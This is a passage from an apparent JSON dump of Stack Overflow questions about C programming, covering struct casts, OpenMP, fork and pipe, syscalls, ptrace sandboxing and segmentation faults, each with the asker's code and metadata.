main(void)\n{\n    str_t str;\n    setStr(&amp;str, \"woot!\");\n    printf(\"%s\\n\", str);\n    return 0;\n}\n</code></pre>\n\n<p>Amazingly, this actually works. This call:</p>\n\n<pre><code>printf(\"%s\\n\", str);\n</code></pre>\n\n<p>seems to be equivalent to this one:</p>\n\n<pre><code>printf(\"%s\\n\", str.cstr);\n</code></pre>\n\n<p>So one would think that the following is also possible:</p>\n\n<pre><code>char* plainstr = malloc(str.len + 1);\nstrcpy(plainstr, str);\n</code></pre>\n\n<p>But no go. In contrast to <code>printf</code>, <code>strcpy</code> is not variadic, so there's type checking. The compiler rightfully complains:</p>\n\n<pre><code>passing 'str_t' to parameter of incompatible type 'const char *'\n</code></pre>\n\n<p>But trying to tell the compiler \"I really mean it\" by casting it:</p>\n\n<pre><code>strcpy(plainstr, (const char*)str);\n</code></pre>\n\n<p>Won't work either:</p>\n\n<pre><code>operand of type 'str_t' where arithmetic or pointer type is required\n</code></pre>\n\n<p>Note that the following can't work:</p>\n\n<pre><code>strcpy(plainstr, (const char*)&amp;str);\n</code></pre>\n\n<p>Since <code>str.cstr != &amp;str</code>. For example, the output of this:</p>\n\n<pre><code>printf(\"%p %p\\n\", str.cstr, &amp;str);\n</code></pre>\n\n<p>Is the following:</p>\n\n<pre><code>0xbdb010 0x7fff788f6ab8\n</code></pre>\n\n<p>And indeed, garbage data is being copied to <code>plainstr</code>.</p>\n\n<p>So the questions are:</p>\n\n<ol>\n<li>Why isn't it allowed to cast a struct to a pointer type?</li>\n<li>How come that <code>printf</code> deals with this correctly if casting isn't allowed?</li>\n</ol>\n"},{"tags":["c","parameters","initialization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13210445,"title":"Why I am getting parameter is initialized error in C?","body":"<pre><code>struct subscriber\n\n{\n\n  char phonenumber[20];\n\n  char name[50];\n\n  float amount;\n\n}s;\n\nvoid modifyrecords()\n\n  FILE *f;\n\n  char phonenumber[20];\n\n  long int size=sizeof(s);\n\n  if((f=fopen(\"c:/file.ojs\",\"rb+\"))==NULL)\n\n    exit(0);\n\n  system(\"cls\");\n\n  printf(\"Enter phone number of the subscriber to modify:\");\n\n  scanf(\"%[^\\n]\",phonenumber);\n\n  fflush(stdin);\n\n  while(fread(&amp;s,sizeof(s),1,f)==1)\n\n  {\n\n    if(strcmp(s.phonenumber,phonenumber)==0)\n\n    {\n\n      system(\"cls\");\n\n      printf(\"\\n Enter phone number:\");\n\n      scanf(\"%s\",&amp;s.phonenumber);\n\n      printf(\"\\n Enter name: \");\n\n      fflush(stdin);\n\n      scanf(\"%[^\\n]\",&amp;s.name);\n\n      printf(\"\\n Enter amount: \");\n\n      scanf(\"%f\",&amp;s.amount);\n\n      fseek(f,-size,SEEK_CUR);\n\n      fwrite(&amp;s,sizeof(s),1,f);\n\n      break;\n\n    }\n\n  }\n\n  fclose(f);\n\n}\n</code></pre>\n\n<p>C:\\Users***\\Desktop\\a.c|394|error: parameter 'size' is initialized|\nI am getting parameter 'size' is initialized error in this code. After googling I found out I may have to pass certain arguments to suppress these kind of errors. Is this the only solution? Actually I am using Code::Blocks so if is the only way how do I pass command line arguments in it?</p>\n"},{"tags":["c","exit","longjmp","setjmp"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13210821,"title":"My exit(status) with setjmp un longjmp","body":"<p>Problem is - I have to implement my own exit(status) with setjmp and longjmp. Maybe someone could give some pointers?</p>\n"},{"tags":["c","openmp","montecarlo"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":988,"score":2,"question_id":6192807,"title":"Using OpenMP to calculate the value of PI","body":"<p>I'm trying to learn how to use OpenMP by parallelizing a monte carlo code that calculates the value of PI with a given number of iterations. The meat of the code is this:</p>\n\n<pre><code>  int chunk = CHUNKSIZE;                                                                                      \n\n    count=0;                                                                                                  \n#pragma omp parallel shared(chunk,count) private(i)                                                           \n  {                                                                                                           \n\n\n#pragma omp for schedule(dynamic,chunk)                                                                       \n      for ( i=0; i&lt;niter; i++) {                                                                              \n        x = (double)rand()/RAND_MAX;                                                                          \n        y = (double)rand()/RAND_MAX;                                                                          \n        z = x*x+y*y;                                                                                          \n        if (z&lt;=1) count++;                                                                                    \n      }                                                                                                       \n  }                                                                                                           \n\n  pi=(double)count/niter*4;                                                                                   \n  printf(\"# of trials= %d , estimate of pi is %g \\n\",niter,pi);  \n</code></pre>\n\n<p>Though this is not yielding the proper value for pi given 10,000 iterations. If all the OpenMP stuff is taken out, it works fine. I should mention that I used the monte carlo code from here: <a href=\"http://www.dartmouth.edu/~rc/classes/soft_dev/C_simple_ex.html\" rel=\"nofollow\">http://www.dartmouth.edu/~rc/classes/soft_dev/C_simple_ex.html</a></p>\n\n<p>I'm just using it to try to learn OpenMP. Any ideas why it's converging on 1.4ish? Can I not increment a variable with multiple threads? I'm guessing the problem is with the variable <code>count</code>.</p>\n\n<p>Thanks!</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":138,"score":7,"question_id":13210673,"title":"what is the purpose of \"(void) ( { CODE } )\" in c?","body":"<p>In a generated piece of c code I found something like this (edited):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n  (void) (\n    {\n      int i = 1;\n      int y = 2;\n\n      printf(\"%d %d\\n\", i,y);\n    }\n  );\n\n  return 0;\n}\n</code></pre>\n\n<p>I believe I have never seen the construct <code>(void) ( { CODE } )</code> before, nor am I able to figure out what the purpose might be.</p>\n\n<p>So, what does this construct do?</p>\n"},{"tags":["c","types","cross-platform"],"answer_count":7,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":838,"score":2,"question_id":1738568,"title":"Any guaranteed minimum sizes for types in C?","body":"<p>I asked a similar question before but I'm still confused... can you generally make any assumptions about the minimum size of a data type?</p>\n\n<p>What I have read so far</p>\n\n<ul>\n<li>char:  1 Byte</li>\n<li>short: 2 Byte</li>\n<li>int:   2 Byte, typically 4 Byte</li>\n<li>long:  4 Byte</li>\n</ul>\n\n<p>float??? double???</p>\n\n<p>Are the values in <code>float.h</code> and <code>limits.h</code> system dependent?</p>\n\n<p>Thx again, Oliver</p>\n"},{"tags":["c","for-loop","int","printf","short"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":81,"score":2,"question_id":13210349,"title":"Cannot understand this code snippet of C","body":"<p>my code is:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nmain() {\n\nshort int i=0;\n\nfor(i&lt;=5 &amp;&amp; i&gt;=-1; ++i; i&gt;0)\n    printf(\"%d, \",i);\n\nreturn 0;\n}\n</code></pre>\n\n<p>OUTPUT:-</p>\n\n<p>i don't know from where it starts but end in the sequence</p>\n\n<pre><code>..., -4, -3, -2, -1\n</code></pre>\n\n<p>can u help me understand the working of this code snippet?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":76,"score":3,"question_id":13210239,"title":"Can a C compiler add padding before the first element in a structure?","body":"<p>Specifically, I was wondering if I could make something like this:</p>\n\n<pre><code>typedef struct {\n    char *s; /* still a cstr, with '0' bit at end */\n    size_t len;\n} str;\nstr *newstr(char *s) {/*...*/};\nvoid freestr(str *s) {/*...*/};\n</code></pre>\n\n<p>and do things like this (treat it as a cstr with <code>stdlib/string</code> functions):</p>\n\n<pre><code>int main() {\n    str *s = newstr(\"hello\");\n    printf(\"The first character of '%s' is '%c'\", *s, (*s)[0]);\n    freestr(s);\n}\n</code></pre>\n\n<p>If not, it's not a big deal—and, of course, I'm not really concerned about wasting a byte.</p>\n"},{"tags":["c++","c","static","include","make"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":13209480,"title":"How can I use variables in multiple files?","body":"<p>I want do define a variable in the header and be able to use it in multiple files. \ne.g. have variable <code>a</code> defined somewhere and be able to use/change it in both p1.cpp and p2.cpp</p>\n\n<p>Here is an example with 3 simple files of what I'm trying to do. </p>\n\n<pre><code>// vars.hpp\n#ifndef VARS_HPP\n#define VARS_HPP\n\nint a = 1;\nfloat b = 2.2;\nvoid double_vars();\n\n#endif\n\n\n\n// vars.cpp\n#include \"vars.hpp\"\nvoid double_vars () {\n    a *= 2;\n    b *= 2;\n}\n\n// vars_main.cpp\n#include &lt;cstdio&gt;\n#include \"vars.hpp\"\nint main () {\n    printf(\"a: %d; b: %f\\n\", a, b);\n    double_vars();\n    printf(\"a: %d; b: %f\\n\", a, b);\n}\n</code></pre>\n\n<p>now, compiling the above with:</p>\n\n<pre><code>g++ -Wall -W -g vars.cpp vars_main.cpp -o vars &amp;&amp; ./vars\n</code></pre>\n\n<p>gives me the following errors:</p>\n\n<pre><code>/tmp/ccTPXrSe.o:(.data+0x0): multiple definition of `a'\n/tmp/ccnc1vof.o:(.data+0x0): first defined here\n/tmp/ccTPXrSe.o:(.data+0x4): multiple definition of `b'\n/tmp/ccnc1vof.o:(.data+0x4): first defined here\n</code></pre>\n\n<p>can someone explain to me why this happens? I have guards in the header file so as far as I understand it should only be included once so there should not be multiple declarations</p>\n"},{"tags":["c","algorithm","pointers","array-sorting"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13210317,"title":"Exchange Memory addresses between array's indixes possible?","body":"<p>I don't have too much experience managing pointers, and other advanced functions but I was thinking if it is possible to make an algorithm to exchange the memory addresses between two elements of an array using pointers, instead copying and moving the value each time ( example while sorting ). Let me explain:</p>\n\n<p>Imagine this array It has 10 elements unsorted, and I pretend to use bubble-sort to sort it (in any order), the typical way is to use a secondary variable to copy the elements and use it as bypass each time i find a smaller or greater number (depends on descending or increasing sorting).</p>\n\n<pre><code>            *----*----*----*----*----*----*----*----*----*----*\narray[10] = | 45 | 21 | 32 | 48 | 32 | 22 | 47 | 10 | 11 | 12 |\n            *----*----*----*----*----*----*----*----*----*----*\n            ^----- Imagine this is 10000\n</code></pre>\n\n<p>The program realizes that the array[ 1 ] is smaller than the array[ 0 ], so the bubble-sort will exchange their values (this is the typical way) using a secondary variable as bypass.</p>\n\n<pre><code>                   *--------------* \n                   |              ^\n                   |              |\n            *--------------*--------------*----*----*----*----*----*----*\narray[10] = |      45      |      21      | 32 | 22 | 47 | 10 | 11 | 12 |\n            *--------------*--------------*----*----*----*----*----*----*\n                   |              ^\n                   |   *------*   |\n                   *--&gt;|BYPASS|---*\n                       *------*\n</code></pre>\n\n<p>So isn't possible to say something like exchange &amp;array[0] and &amp;array[1] addresses? So i avoid the secondary variable? In this case &amp;array[1] = 10000; and &amp;array[0] = 10004.</p>\n\n<p>Thanks for your attention and all suggestions are allowed! </p>\n"},{"tags":["c","linux","chdir"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":13204650,"title":"how to chdir in c program in Linux environment","body":"<p>I am new in c programming.\nHow can I get in in Linux environment like /home/jobs/$ans/xxx/ while I have $ans is a user string I can't chdir in c program.</p>\n\n<p>My script is below:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\nint main()\n{\nchar jdir;\nprintf(\"Enter job directory:\");  /* user input for different directories */\nscanf(\"jdir\");\nchdir(\"/home/jobs/%jdir/xxx\");\nsystem(\"ls -ltr\");\nreturn(0);\n}\n</code></pre>\n\n<p>How to getin chdir?</p>\n"},{"tags":["c","recursion","for-loop","procedural-programming","repetition"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":281,"score":-1,"question_id":10465054,"title":"How to solve this peculiar nested for loops exercise?","body":"<p>I've been studying C programming for a while and I've stumbled on this exercise I can't seem to solve:</p>\n\n<ul>\n<li><p>Write nests of loops that cause the following output to be displayed:</p>\n\n<pre><code>0\n01\n012\n0123\n01234\n012345\n01234\n0123\n012\n01\n0\n</code></pre></li>\n</ul>\n\n<p>Until now I've managed to get to the sixth row, but I can't finish the exercise.\nThis is the code I've written to obtain half of the solution to this problem:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint\nmain(void)\n{\n\nint i, j;\n\nfor(i = 1; i &lt;= 6; ++i) {\nfor(j = 0; j &lt; i; ++j)\n\n    printf(\"%d\", j);\n    printf(\"\\n\");\n\n }\n\nreturn(0);\n\n}\n</code></pre>\n\n<p>The answer had some reasearch effort, was clear; maybe useful for someone studying the same subject, so it was downvoted for no reason.</p>\n"},{"tags":["c","wait"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":10936805,"title":"C error - wait()","body":"<p>I write a program using memory segments but the problem is my wait() is throwing me an error</p>\n\n<p>error:</p>\n\n<pre><code>ks.c:24:2: error: incompatible type for argument 1 of ‘wait’\n/usr/include/x86_64-linux-gnu/sys/wait.h:116:16: note: expected ‘__WAIT_STATUS’ but argument is of type ‘int’\ns.c:13:6: warning: unused variable ‘w’ [-Wunused-variable]\n</code></pre>\n\n<p>Code line is simple <code>wait(1);</code>  and i have includeted  all neccesarry ehaders for the project why do i get that error, since it should work like this...\nimports</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/ipc.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;errno.h&gt;\n#include \"st.h\"\n</code></pre>\n"},{"tags":["c","strtok","factors","strtol"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":10937266,"title":"End condition for a factorising loop","body":"<p>Good evening, </p>\n\n<p>I'm having trouble with an assignement. </p>\n\n<p>Basically we're required to code a program which will calculate the prime factors of a given <code>stdin</code>. The data may only enter the program through its <code>stdin</code>, be it throuh an <code>echo</code> or a <code>&lt; file.txt</code>. The stream of data will never be greater than 80 characters (they can be numbers or not). </p>\n\n<p>The functions I use in the program are <code>read()</code>, <code>strotol()</code> and <code>strtok()</code>, and the \"irrelevant\" code flows as follows: </p>\n\n<ol>\n<li>Uses <code>malloc</code> to allocate 80 initial bytes of memory. </li>\n<li>Stores in an <code>int</code>, through <code>read()</code> the number of characters read (and I believe, the last <code>\\0</code>). </li>\n<li>reallocates memory with <code>realloc()</code> so as to save as much memory (I know in this case it's trivial, but oh well...). </li>\n</ol>\n\n<p>Now comes the tricky bit:</p>\n\n<ol>\n<li>Since the data has to be separated with spaces, the max amount of items to check are at most: <code>(n/2)+1</code>, where <code>n</code> is the number of characters read in the upper point nº 2. </li>\n<li>Creates an array of <code>long</code> with max size the number obtained in point nº 1. </li>\n<li>Fills <code>numbers[0]</code> with the result of: <code>strtol(strtok(line, delim), &amp;end, 10)</code>.</li>\n<li><p>Adds <code>1</code> to the <code>counter</code> and enters a <code>while</code> loop: </p>\n\n<pre><code>while((numbers[counter] = strtol(strtok(NULL, delim), &amp;end, 10)) != NULL) {\n    if(!*end) {\n        // Check whether it's 0, 1, negative, prime or extract its factors\n    }\n    else {\n        fprintf(stderr, \"\\\"%s\\\" is not a non-negative integer\", end)\n    }\n    counter++;\n}\n</code></pre></li>\n</ol>\n\n<p>Now, here are some inputs and their outputs: </p>\n\n<p>Input: <code>echo 1 2 3 4 5 6 7 8 9 10 | ./factors</code> </p>\n\n<p>Output: </p>\n\n<pre><code>1\n2    \n3\n    2    2\n5\n    2    3\n7 \n    2    2    2\n    3    3\n    2    5\nSegmentation Fault (core dumped). \n</code></pre>\n\n<p>Input <code>./factors &lt; integers.txt</code>\nWhere integers contains a COLUMN of integers. </p>\n\n<p>Output: </p>\n\n<p>All the integers are factorised just fine and at the end it prints a: </p>\n\n<pre><code>Segmentation Fault (core dumped). \n</code></pre>\n\n<p>Input: <code>echo abc 12 13 14 15 | ./factors</code></p>\n\n<p>Output: </p>\n\n<pre><code>\"abc\" is not a non-negative integer\n13\n    2    7\n    3    5\nSegmentation Fault (core dumped). \n</code></pre>\n\n<p>Input: <code>echo -1 -2 -3 -4 -5 | ./factors</code></p>\n\n<p>Output: </p>\n\n<pre><code>\"-1\" is not a non-negative integer\n\"-2\" is not a non-negative integer\n\"-3\" is not a non-negative integer\n\"-4\" is not a non-negative integer\n\"-5\" is not a non-negative integer\n</code></pre>\n\n<p>Input: <code>echo abc abc abc | ./factors</code></p>\n\n<p>Output: </p>\n\n<pre><code>\"abc\" is not a non-negative integer\n</code></pre>\n\n<p>(And does not continue checking). </p>\n\n<p>Input: <code>echo 3 4 0 6 7 | ./factors</code></p>\n\n<p>Output: </p>\n\n<pre><code>3\n    2    2\n</code></pre>\n\n<p>(And does not continue checking). </p>\n\n<p>So as far as I can see, it fails when it encounters a <code>0</code>, more than one instance of a non-<code>integer</code> or basically at the end of a healthy <code>integer</code>-based stream of data. </p>\n\n<p>Any idea how I could tackle this while and why is it failing so apparently randomly? </p>\n\n<p>I should let you know I'm new to C...</p>\n\n<p>Thank you very much in advanced. </p>\n\n<p>====================================================</p>\n\n<p>EDIT1: As per request, here are the code fragments which generate <code>numbers[]</code>, and read from <code>stdin</code>: </p>\n\n<pre><code>char *line;\nchar *end;\nchar *delim = \" \\n\";\nint charsread, counter; \n\nline = malloc(80);\ncharsread = read(0, line, 81);\nif (charsread == 0) {\n    return EX_OK;\n}\nrealloc(line, charsread);\nmaxelem = (charsread / 2) + 1;\nlong numbers[maxelem];\nnumbers[0] = strtol(strtok(line, delim), &amp;end, 10);\nif (!*end) {\n    zeroone(numbers[0]);\n}\nelse {\n    fprintf(stderr, \"\\\"%s\\\" is not a non-negative integer\\n\", end);\n}\ncounter = 1;\nwhile [...]\n</code></pre>\n"},{"tags":["c","fork","pipe"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":117,"score":1,"question_id":10937600,"title":"Having trouble with pipe / fork. Can't understand half of the manual (man)","body":"<p>At a course the teacher gave us some code (on the chalk board) but he has horrible hand writing, and I can't make a few parts out. Also new at both pipe and fork so that doesn't help.</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/wait.h&gt;\nvoid main () {\n    int a[] = {1,2,3,4}, f[2];  // ok so we initialize an array and a \"pipe folder\" (pipefd in manual) ?\n    pipe (f);                   // not 100% sure what this does ?\n    if (fork () == 0) {         // if child\n        close (f[0]);               // close pipe read-end\n        a[0] += a[1];               \n        write (f[1], &amp;a[0], sizeof (int))      // fixed\n        close (f[1]);               // close pipe write-end\n        exit(0);                    // closes child and sends status update to parent ?\n    }\n    else {                          // if parent\n        close (f[1])                // close write-end of pipe\n        a[2]+=a[3];\n        read (f[0], &amp;a, sizeof(int))          // fixed\n        wait (0);                   // waits for child to ... close ? or just finish ? or is it the same thing\n        a[0]+= a[2]; close (f[0]); \n        printf (\"%d\\n, \"a[0]);\n   }\n}\n</code></pre>\n\n<p>Does the child and parent go in some particular order. I'm guessing parent waits for child to close, if <code>close (f[1])</code> returns no error it continues ? (btw what does the \"0\" stand for in <code>wait(0)</code>) and only then continues ?</p>\n\n<p>What am I misunderstanding? am I getting something right ?</p>\n\n<p>I thought I should mention that I did some research using <code>man</code> but I find it tremendously confusing. <strong>As far as I am concerned</strong> they are for users who already either know what they are doing but forgot some details (like what to include and what -p does) or people who have a more than basic understanding.</p>\n"},{"tags":["c","linux","ipc","fork"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13206602,"title":"How to redirect the IO of child process created by fork() and uses exec() function?","body":"<p>I am writing a Shell in C language. User should be able to execute various commands and use pipe(|) to redirect input of one command to the other. The main shell process is the parent process and forks new process for each command and in child process the command is called by exec*() function. </p>\n\n<p>But I can't figure out how to redirect the Standard input/output of one child process to the other. </p>\n"},{"tags":["c","embedded","msp430"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13207342,"title":"uint8_t * const LCDMem = (uint8_t *) &LCDM3; meaning","body":"<pre><code>uint8_t * const LCDMem = (uint8_t *) &amp;LCDM3;\n</code></pre>\n\n<p>This code is used in msp430fg4618 trainer kit for lcd configuration.\nCould any one please explain the meaning of the above mentioned code?</p>\n\n<p>It allows use of <code>array LCDMem[]</code>? I don't know how. </p>\n"},{"tags":["c","return","main"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":78,"score":-1,"question_id":13200949,"title":"What happens with the return value of main()?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/204476/what-should-main-return-in-c-c\">What should main() return in C/C++?</a>  </p>\n</blockquote>\n\n\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    return 0;\n}\n</code></pre>\n\n<p>In the code snippet given above, where does the return 0 returned by main go? Or in other words which function called the main function in the beginning.</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":80,"score":-1,"question_id":13209632,"title":"Using write syscall to print integers","body":"<p>I would like to have the equivalent of </p>\n\n<pre><code>void print3( char a, uint8_t b, int8_t c )\n{\n    printf(\"%c %\" PRIu8 \" %\" PRIi8 \"\\n\", a, b, c);\n}\n</code></pre>\n\n<p>using the <code>write</code> syscall. The problem is, I don't know how to print an integer using  <code>write</code>. Only commands from ANSI C are allowed and using <code>sprintf</code> to format strings is forbidden. </p>\n\n<p>Example syntax to use write:</p>\n\n<pre><code>const char msg[] = \"Hello World!\";\nwrite(STDOUT_FILENO, msg, sizeof(msg)-1);\n</code></pre>\n\n<p>Thanks in advance.</p>\n\n<p>Edit: Please stop voting to close this question. It is not a duplicate of other questions. I am not allowed to use <code>sprintf</code> neither <code>itoa</code>. I don't understand the downvotes either.</p>\n"},{"tags":["c","ubuntu","netbeans"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13209867,"title":"how do you compile 2 c files in netbeans","body":"<p>I am using netbeans in ubuntu 11.04 and i have the main.c which holds the main method and in addition to that i have another .c file that i need to compile along with the main.c file. Actually this is how i used to compile it when i developed my code in gedit.</p>\n\n<pre><code>gcc -o program main.c ini.c\n</code></pre>\n\n<p>I searched the internet and found the run options but couldn't figure out exactly where to insert the additional command line parameters. I am new to this area of development and could someone please shed some light to this ?</p>\n"},{"tags":["c","linux","sockets","tcp"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1444,"score":2,"question_id":7286592,"title":"Set TCP_QUICKACK and TCP_NODELAY","body":"<p>If you set the TCP_QUICKACK setting on every call on the socket, having previously set TCP_NODELAY, will the QUICKACK option overwrite the NODELAY call?</p>\n\n<p>On connect:</p>\n\n<pre><code>int i = 1;\nsetsockopt( iSock, IPPROTO_TCP, TCP_NODELAY, (void *)&amp;i, sizeof(i));\n</code></pre>\n\n<p>On each write:</p>\n\n<pre><code>int i = 1;\nsetsockopt( iSock, IPPROTO_TCP, TCP_QUICKACK, (void *)&amp;i, sizeof(i));\n</code></pre>\n\n<p>Will the call to TCP_QUICKACK null the previous call to TCP_NODELAY?</p>\n"},{"tags":["c","eclipse","parsing","eclipse-cdt"],"answer_count":1,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":282,"score":8,"question_id":10737205,"title":"Using Eclipse CDT parser outside of CDT","body":"<p>Is it possible to use Eclipse's CDT parser outside of Eclipse, to analyze C sources off line?</p>\n"},{"tags":["c","pointers","copy"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":13208759,"title":"Creating copy of a structure in C","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4931123/copying-one-structure-to-another\">Copying one structure to another</a>  </p>\n</blockquote>\n\n\n\n<p>I have a struct defined as </p>\n\n<pre><code>struct CKTcircuit \n{ \n    more than a 100 pointers and objects of different types  of structure.\n    this structure has around 500 lines just declaring variables &amp; pointers.\n}\n</code></pre>\n\n<p>Now I have a object of this type instantiated.</p>\n\n<p>And I have to create a copy this same type.</p>\n\n<p>Any solutions how do I do this?</p>\n\n<p>P.S.: I need to do this because I need to launch another thread doing computations and modifying the CKTcircuit object.</p>\n"},{"tags":["c","system-programming","mkfifo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13040021,"title":"mkfifo() error ---> \"Error creating the named pipe.: File exists\"","body":"<p>The mkfifo function takes 2 arguments, path and mode.  But I don't know what is the format of the path that it uses.  I am writing a small program to create a named pipe and as path in the <code>mkfifo</code>.   Using <code>/home/username/Documents</code> for example, but it always returns -1 with the message <code>Error creating the named pipe.: File exists</code>.</p>\n\n<p>I have checked this dir a lot of times and there is no pipe inside it. So I am wondering what is the problem.  The mode I use in mkfifo is either 0666 or 0777.</p>\n"},{"tags":["c","printf"],"answer_count":7,"favorite_count":3,"up_vote_count":5,"down_vote_count":1,"view_count":423,"score":4,"question_id":11772291,"title":"How can I print a quotation mark in C?","body":"<p>In an interview I was asked</p>\n\n<blockquote>\n  <p>Print a quotation mark using the <code>printf()</code> function</p>\n</blockquote>\n\n<p>I was overwhelmed. Even in their office there was a computer and they told me to try it. I tried like this:</p>\n\n<pre><code>void main()\n{\n    printf(\"Printing quotation mark \" \");\n}\n</code></pre>\n\n<p>but as I suspected it doesn't compile. When the compiler gets the first <code>\"</code> it thinks it is the end of string, which is not. So how can I achieve this?</p>\n"},{"tags":["c++","c"],"answer_count":6,"favorite_count":0,"up_vote_count":11,"down_vote_count":4,"view_count":239,"score":7,"question_id":13209032,"title":"How to calculate the difference of two numbers in c++?","body":"<p>I'm new in C++, and I have no idea how to manage it.\nIf I enable double and integer only, then it is 4 functions. But I want to enable all data types (int long float double unsigned numbers etc...) How is it possible?</p>\n\n<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\ndouble diff(int num1, int num2) {\n    return double(num1-num2);\n}\n\ndouble diff(int num1, double num2) {\n    return double(num1)-num2;\n}\n\ndouble diff(double num1, int num2) {\n    return num1-double(num2);\n}\n\ndouble diff(double num1, double num2) {\n    return num1-num2;\n}\n\nint main() {\n    int a = 10;\n    double b = 4.4;\n    cout &lt;&lt; diff(a, b) &lt;&lt; endl;\n    return 0;\n}\n</code></pre>\n"},{"tags":["c++","c","ptrace"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":67,"score":4,"question_id":13208910,"title":"How to prevent a system call from being executed with ptrace","body":"<p>I'm working on a Ideone-like system where untrusted user code must run in sandboxed mode. </p>\n\n<p>For this I've been looking the possibilities of <code>ptrace</code> for a first layer of protection. However, after a few experiments it seems that:</p>\n\n<ul>\n<li>I can intercept a system call before it's called and modify the input arguments.</li>\n<li>I can intercept a system call after it has been called and change the return value.</li>\n<li>However,  there seems to be no way to prevent the call from happing at all (except for killing the entire application).</li>\n</ul>\n\n<p>I want to intercept certain system calls and return a fake result code without the call actually happening. Is there a way to implement this?</p>\n"},{"tags":["c","arrays","pointers"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13208673,"title":"Is it possible to allocate array inside function and return it using reference?","body":"<p>I've tried using a tripple pointer, but it keeps failing. Code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint set(int *** list) {\n  int count, i;\n  printf(\"Enter number:\\n\");\n  scanf(\"%d\", &amp;count);\n  (*list) = (int **) malloc ( sizeof (int) * count);\n\n  for ( i = 0; i&lt;count;i++ ) {\n    (**list)[count] = 123;\n  }\n  return count;\n}\n\nint main ( int argc, char ** argv )\n{\n  int ** list;\n  int count;\n\n  count = set(&amp;list);\n\n  return 0;\n}\n</code></pre>\n\n<p>Thanks for any advice</p>\n"},{"tags":["c","linux","serial-port","vmware-fusion","virtual-serial-port"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13027564,"title":"Configure virtual serial port between 2 vmware fusion virtual machine","body":"<p>I'm developing a program that sends a file from one computer to another between a RS232 serial port. </p>\n\n<p>I can test it on the school computers just fine, but I would like to be able to test it at home. So I'm trying to connect 2 virtual machines between a virtual serial port in vmware fusion, but I don't understand how to configure it.</p>\n\n<p>I've installed the 2 virtual machines and added a serial port to each one (in the settings). But the only available option is to name the file that the serial port will use. This name will be used how?</p>\n\n<p>I'm working with the /dev/ttyS1 port, can I still use it normally, and somehow redirect the output to the file that was configured?</p>\n"},{"tags":["c","dynamic","segmentation-fault"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13208610,"title":"what is causing segmentation fault in c code, dynamic allocation accross functions","body":"<p>I am trying to have dynamically allocate arrays of structures and perform operations on them but i keep running into segmentation faults. could someone help me out?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid *malloc(size_t size);\n\ntypedef struct {\n  double x;\n  double y;\n} coords;\n\nstruct figure {\n  char fig_name[128];\n  int coordcount, size_tracker;\n  coords *pointer;\n} fig;\n\nvoid init_fig(int n, struct figure **point)\n{\n  printf(\"%u\\n\", sizeof(coords));\n  point[n]-&gt;pointer = malloc(sizeof(coords) * 20);  &lt;-------SEGFAULT\n  if (point[n]-&gt;pointer == NULL){\n    exit(-1);\n  }\n  point[n]-&gt;pointer[19].x = 2;\n  point[n]-&gt;pointer[0].x = 1;\n  